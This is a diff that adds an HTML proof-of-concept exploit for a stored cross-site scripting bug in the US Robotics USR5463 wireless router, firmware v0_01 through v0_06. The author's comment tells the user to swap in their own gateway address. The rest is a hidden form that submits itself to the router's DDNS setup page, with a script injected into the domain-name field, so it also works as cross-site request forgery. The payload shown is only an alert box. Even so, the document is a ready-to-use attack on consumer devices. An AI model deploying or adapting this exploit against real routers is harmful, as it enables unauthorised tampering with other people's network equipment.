@@ -1,0 +1,14 @@
+&lt;!--
+Author: SH4V
+BUG: permanent XSS
+Firmware: USR5463-v0_01.bin - USR5463-v0_06.bin
+Router: USR5463 802.11g Wireless Router
+Company: US Robotics
+Just change http://192.168.2.1/ by your current gateway.
+--&gt;
+&lt;form action=&quot;http://192.168.2.1/cgi-bin/setup_ddns.exe&quot; method=&quot;post&quot;&gt;
+&lt;input type=hidden name=&quot;ddns_domainame&quot; value=&#039;&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;&#039;&gt;
+&lt;input type=hidden name=&quot;ddns_account&quot; value=&#039;&#039;&gt;
+&lt;input type=password size=1 name=&quot;ddns_password&quot; value=&#039;&#039;&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit()&lt;/script&gt;
